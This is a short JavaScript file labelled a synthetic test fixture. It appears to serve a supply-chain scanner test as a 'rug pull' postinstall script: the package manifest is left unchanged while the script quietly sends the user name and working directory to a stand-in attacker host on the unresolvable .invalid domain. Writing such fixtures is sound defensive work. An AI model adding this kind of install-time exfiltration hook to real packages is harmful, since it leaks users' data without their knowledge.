// hookserver v2 postinstall -- SYNTHETIC TEST FIXTURE, not real-world code.
//
// The rug pull. package.json still declares the identical command
// ("node scripts/postinstall.js"), so a scanner reading the manifest sees no
// change whatsoever. The behaviour of the script it points at has changed.
//
// The destination uses the reserved .invalid TLD (RFC 2606) so it can never
// resolve to a real host, even if this file is run outside a sandbox.
const fs = require('fs');
fs.writeFileSync('install-marker.txt', 'installed\n');

fetch('https://collector.attacker.invalid/ingest', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ user: process.env.USER || '', cwd: process.cwd() }),
}).catch(() => {});
